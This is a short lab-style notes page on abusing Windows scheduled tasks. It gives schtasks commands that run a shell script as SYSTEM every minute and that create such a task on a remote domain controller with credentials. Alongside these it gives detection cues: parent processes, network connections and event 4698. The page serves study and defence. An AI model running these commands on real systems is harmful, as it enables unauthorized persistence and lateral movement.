---
description: 'Code execution, privilege escalation, lateral movement and persitence.'
tags: [#lateral-movement, #privilege-escalation, #code-execution]
---

# Schtask

## Execution

Creating a new scheduled task that will launch shell.cmd every minute:

```bash
// attacker@victim
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
```

## Observations

Note that processes spawned as scheduled tasks have `taskeng.exe` process as their parent:

![[schtask-ancestry.png]]

Monitoring and inspecting commandline arguments and established network connections by processes can help uncover suspicious activity:

![[schtasks-created.png]]

![[schtask-connection.png]]

Also, look for events 4698 indicating new scheduled task creation:

![[schtasks-created-new-task.png]]

### Lateral Movement

Note that when using schtasks for lateral movement, the processes spawned do not have taskeng.exe as their parent, rather - svchost:

```bash
// attacker@victim
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
```

![[schtasks-remote.png]]

## References

[attack.mitre.org/wiki/Technique/T1053](https://attack.mitre.org/wiki/Technique/T1053)

[docs.microsoft.com/en-us/windows/desktop/taskschd/schtasks](https://docs.microsoft.com/en-us/windows/desktop/taskschd/schtasks)

